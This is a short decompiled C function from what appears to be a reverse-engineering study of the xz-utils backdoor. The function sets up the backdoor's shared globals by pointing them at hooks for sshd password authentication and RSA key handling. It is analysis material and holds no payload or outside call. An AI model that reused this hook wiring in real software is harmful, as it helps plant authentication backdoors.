// /home/kali/xzre-ghidra/xzregh/102850_init_shared_globals.c
// Function: init_shared_globals @ 0x102850
// Calling convention: __stdcall
// Prototype: int __stdcall init_shared_globals(backdoor_shared_globals_t * shared_globals)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Initializes the backdoor_shared_globals structure
 *
 *   @param shared_globals the backdoor_shared_globals structure
 *   @return int returns 0 on success, or 5 if @p shared_globals was NULL
 */

int init_shared_globals(backdoor_shared_globals_t *shared_globals)

{
  int iVar1;
  
  iVar1 = 5;
  if (shared_globals != (backdoor_shared_globals_t *)0x0) {
    shared_globals->mm_answer_authpassword_hook = mm_answer_authpassword_hook;
    shared_globals->hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
    shared_globals->globals = (global_context_t **)&global_ctx;
    iVar1 = 0;
  }
  return iVar1;
}

